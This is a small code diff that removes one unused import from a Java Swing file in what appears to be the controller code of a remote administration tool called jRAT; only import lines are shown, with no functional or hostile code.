@@ -5,7 +5,6 @@ import jrat.controller.AbstractSlave;
 import jrat.controller.OfflineSlave;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet40Thumbnail;
-import jrat.controller.utils.Utils;
 
 import javax.swing.*;
 import java.awt.*;
